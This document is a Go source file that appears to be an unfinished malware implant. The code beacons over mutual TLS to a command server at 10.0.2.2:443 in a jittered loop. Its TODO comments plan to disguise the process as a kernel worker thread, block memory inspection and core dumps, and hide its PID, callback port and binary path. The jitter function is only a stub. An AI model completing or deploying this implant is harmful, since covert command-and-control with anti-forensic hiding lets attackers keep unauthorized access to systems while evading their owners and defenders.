package main

import (
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

const (
	serverAddr = "10.0.2.2:443"
	baseDelay  = 30 * time.Second
	jitterMax  = 30 * time.Second
)

func main() {
	// TODO: prctl(PR_SET_NAME, "[kworker/0:1]") to masquerade as kernel thread

	// TODO: prctl(PR_SET_DUMPABLE, 0) to prevent /proc/pid/mem access

	// TODO: setrlimit(RLIMIT_CORE, 0) to prevent core dumps

	// Load embedded certs and connect with mTLS
	caPEM, err := os.ReadFile("ca.crt")
	if err != nil {
		log.Fatalf("read CA: %v", err)
	}
	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(caPEM)

	cert, err := tls.LoadX509KeyPair("agent.crt", "agent.key")
	if err != nil {
		log.Fatalf("load agent cert: %v", err)
	}

	tlsCfg := &tls.Config{
		RootCAs:      pool,
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS13,
	}

	for {
		conn, err := tls.Dial("tcp", serverAddr, tlsCfg)
		if err != nil {
			log.Printf("dial: %v", err)
			time.Sleep(jitter(baseDelay, jitterMax))
			continue
		}

		// TODO: auto-hide own PID, callback port, and binary path via mkdir

		fmt.Fprintf(conn, "PING\n")
		conn.Close()

		time.Sleep(jitter(baseDelay, jitterMax))
	}
}

// TODO: jitter returns base + random offset in [0, spread) using crypto/rand
func jitter(base, spread time.Duration) time.Duration {
	return base
}

// suppress unused import warnings
var (
	_ = rand.Read
	_ = binary.LittleEndian
	_ = unsafe.Pointer(nil)
	_ = unix.PR_SET_NAME
)
